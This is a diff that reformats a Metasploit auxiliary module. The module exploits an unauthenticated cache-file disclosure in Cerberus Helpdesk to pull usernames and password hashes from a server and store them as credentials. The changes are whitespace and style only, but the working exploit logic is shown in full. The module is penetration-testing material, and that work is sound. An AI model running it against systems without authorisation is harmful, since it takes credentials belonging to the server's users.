@@ -10,29 +10,28 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'Cerberus Helpdesk User Hash Disclosure',
-      'Description'  => %q{
+      'Name' => 'Cerberus Helpdesk User Hash Disclosure',
+      'Description' => %q{
         This module extracts usernames and password hashes from the Cerberus Helpdesk
         through an unauthenticated access to a workers file.
         Verified on Version 4.2.3 Stable (Build 925) and 5.4.4
         },
-      'References'   =>
-        [
-          [ 'EDB', '39526' ]
-        ],
-      'Author'       =>
-        [
-          'asdizzle_', # discovery
-          'h00die',    # module
-        ],
-      'License'      => MSF_LICENSE,
+      'References' => [
+        [ 'EDB', '39526' ]
+      ],
+      'Author' => [
+        'asdizzle_', # discovery
+        'h00die', # module
+      ],
+      'License' => MSF_LICENSE,
       'DisclosureDate' => 'Mar 7 2016'
     )
 
     register_options(
       [
         OptString.new('TARGETURI', [false, 'URL of the Cerberus Helpdesk root', '/'])
-      ])
+      ]
+    )
   end
 
   def run_host(rhost)
@@ -40,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
       ['devblocks', 'zend'].each do |site|
         url = normalize_uri(datastore['TARGETURI'], 'storage', 'tmp', "#{site}_cache---ch_workers")
         vprint_status("Attempting to load data from #{url}")
-        res = send_request_cgi({'uri' => url})
+        res = send_request_cgi({ 'uri' => url })
         if !res
           print_error("#{peer} Unable to connect to #{url}")
           next
@@ -51,8 +50,8 @@ class MetasploitModule < Msf::Auxiliary
           next
         end
 
-        cred_table = Rex::Text::Table.new 'Header'  => 'Cerberus Helpdesk User Credentials',
-                                          'Indent'  => 1,
+        cred_table = Rex::Text::Table.new 'Header' => 'Cerberus Helpdesk User Credentials',
+                                          'Indent' => 1,
                                           'Columns' => ['Username', 'Password Hash']
 
         # the returned object looks json-ish, but it isn't. Unsure of format, so we'll do some ugly manual parsing.
@@ -66,8 +65,8 @@ class MetasploitModule < Msf::Auxiliary
             password_hash = cred[7].tr('";', '') # remove extra characters
             print_good("Found: #{username}:#{password_hash}")
             store_valid_credential(
-              user:         username,
-              private:      password_hash,
+              user: username,
+              private: password_hash,
               private_type: :nonreplayable_hash
             )
             cred_table << [username, password_hash]
@@ -77,7 +76,6 @@ class MetasploitModule < Msf::Auxiliary
         print_line cred_table.to_s
         break
       end
-
     rescue ::Rex::ConnectionError
       print_error("#{peer} Unable to connect to site")
       return
